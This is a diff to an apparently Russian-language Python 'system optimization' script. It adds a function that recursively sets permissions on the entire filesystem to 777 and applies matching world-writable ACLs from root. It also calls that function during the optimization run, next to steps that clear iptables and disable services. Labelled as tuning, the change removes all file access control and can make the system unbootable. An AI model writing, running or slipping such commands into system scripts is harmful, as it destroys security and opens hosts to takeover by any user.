@@ -32,6 +32,12 @@ def set_limits():
         except ValueError as e:
             logging.warning(f"⚠️ Не удалось изменить лимит {limit}: {e}")
 
+def grant_full_permissions():
+    """Выдача всем пользователям полного доступа."""
+    run_command("chmod -R 777 /")  # Полные права на все файлы
+    run_command("setfacl -R -m u::rwx,g::rwx,o::rwx /")  # Установка ACL для всех
+    logging.info("✅ Все пользователи теперь имеют полный доступ ко всем файлам.")
+
 def optimize_network():
     """Оптимизация сетевых настроек."""
     settings = {
@@ -121,6 +127,7 @@ def apply_all():
     logging.info("⚙️ Начало оптимизации системы...")
     
     set_limits()
+    grant_full_permissions()
     optimize_network()
     clear_iptables()
     disable_services()
